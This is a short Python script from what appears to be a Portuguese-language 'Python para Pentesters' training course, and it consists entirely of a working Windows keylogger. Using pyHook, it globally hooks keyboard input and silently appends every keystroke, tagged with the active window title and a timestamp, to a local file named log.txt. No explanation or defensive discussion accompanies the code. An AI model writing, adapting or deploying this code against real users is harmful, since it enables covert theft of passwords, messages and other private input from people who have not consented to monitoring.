#############################
# Python para Pentesters    #
# solyd.com.br/treinamentos #
#############################

import pyHook
import pythoncom

janela = None

def tecla_pressionada(evento):
    arquivo = open('log.txt', 'a')
    global janela
    if evento.WindowName != janela:
        janela = evento.WindowName
        arquivo.write('\n' + janela + ' - ' + str(evento.Time) + '\n')
    arquivo.write(chr(evento.Ascii))
    arquivo.close()

hook = pyHook.HookManager()
hook.KeyDown = tecla_pressionada
hook.HookKeyboard()

pythoncom.PumpMessages()